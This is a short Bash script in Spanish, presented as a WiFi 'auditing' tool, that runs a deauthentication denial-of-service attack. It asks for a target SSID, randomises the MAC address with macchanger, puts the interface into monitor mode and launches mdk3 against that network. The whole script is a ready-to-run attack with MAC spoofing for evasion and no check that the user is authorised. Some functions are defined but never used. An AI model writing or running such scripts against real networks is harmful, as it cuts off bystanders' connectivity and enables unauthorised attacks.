#!/bin/bash

# Kawaii Deauther WiFi Auditing Tool
# Author: Juan Perez 
# Description: Script para auditoría de WiFi mediante ataques de denegación de servicio

# Constantes
readonly BK="\e[0m"    # Negro
readonly GR="\e[32m"   # Verde
readonly RD="\e[31m"   # Rojo
readonly YW="\e[33m"   # Amarillo  
readonly WH="\e[37m"   # Blanco

# Imprime el banner
print_banner() {
  cat <<_BANNER_ 
        ${BK}${GR}
                                 @@@        @   @
                                @@@@       @@@
             @@@@@@@    @@@@   @@@@       @@@@@
            @@@@@@@@@  @@@@@@@ @@@@       @@@@@@@
              @@@@         @@@@ @@@@       @@@@
               @@@          @@@ @@@@       @@@

_BANNER_
}

# Selecciona una interfaz de red
get_interface() {

  ifaces=($(ifconfig | grep mtu | awk '{print $1}'))

  echo -e "${WH} Interfaces disponibles: "
  
  for ((i=0; i<${#ifaces[@]}; i++)); do
    echo -e "${GR}$((i+1))). ${ifaces[$i]}"
  done

  read -p "Seleccione una interfaz: " selection

  [[ $selection -lt 1 || $selection -gt ${#ifaces[@]} ]] && 
    { echo -e "${RD} ¡Interfaz inválida!"; get_interface; }
  
  iface=${ifaces[$selection-1]}
  echo -e "${WH} Interfaz seleccionada: ${GR}$iface"
}

# Activa el modo monitor en la interfaz
monitor_mode() {

  ifconfig $1 down
  iwconfig $1 mode monitor
  macchanger -r $1
  ifconfig $1 up
  
  echo -e "${WH}[${GR}+${WH}] ${GR}Se activó el modo monitor en ${WH}$1"

}

# Desactiva el modo monitor
managed_mode() {

  ifconfig $1 down
  iwconfig $1 mode managed
  macchanger -p $1
  ifconfig $1 up  

  echo -e "${WH}[${RD}-${WH}] ${RD}Se desactivó el modo monitor en ${WH}$1" 

}

# Ataque de denegación de servicio a una SSID
attack_ssid() {
  
  read -p "Ingresa el SSID a atacar: " ssid
  monitor_mode $iface  

  echo -e "${RD}¡COMENZANDO ATAQUE! ${YW}ヽ(゚Д゚)ノ"

  mdk3 $iface d -n $ssid

  managed_mode $iface

  echo -e "${RD}¡ATAQUE FINALIZADO! ${YW}~(=^..^)丿"  

}

# Muestra el menú interactivo 
show_menu() {

  print_banner
  echo -e "${WH} MENÚ PRINCIPAL"
  echo -e "${WH} 1) Ataque a SSID"
  echo -e "${WH} 2) Salir"

  read -p "Seleccione una opción: " option

}

# Programa principal
iface="wlan0"

while :; do

  show_menu

  case $option in
  
    1) 
      attack_ssid
      ;;

    2)
      echo -e "${WH} ¡Hasta luego! (^_^)/"
      break  
      ;;  

    *)
      echo -e "${RD} ¡Opción inválida!${WH}"
  esac  

done
